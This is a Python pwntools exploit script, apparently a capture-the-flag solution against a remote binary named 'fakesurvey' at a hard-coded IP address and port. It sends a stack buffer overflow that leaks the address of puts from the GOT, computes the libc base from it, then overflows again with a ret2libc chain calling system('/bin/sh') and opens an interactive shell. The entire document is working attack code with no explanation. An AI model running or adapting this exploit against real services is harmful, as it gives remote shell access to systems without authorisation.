from pwn import *

#io = process('./fakesurvey')
io = remote('185.235.41.205', 7050)
elf = ELF('./fakesurvey')
libc = ELF('./libc.so')

print(io.recv())
io.sendline('CPRSyRMOFa3FVIF')
print(io.recv())
payload = b'A'*0x4c
payload += p32(elf.sym['puts'])
payload += p32(elf.sym['main'])#p32(0x08049711)
payload += p32(elf.got['puts'])

io.send(payload)
print(io.recvuntil(b'opinions with us ***\n'))
libc.address = u32(io.recv(4)) - libc.sym['puts']
print(io.recv())
io.sendline('CPRSyRMOFa3FVIF')
print(io.recv())
payload = b'A'*0x4c
payload += p32(libc.sym['system'])
payload += p32(libc.sym['exit'])
payload += p32(next(libc.search(b'/bin/sh')))

io.send(payload)
io.interactive()
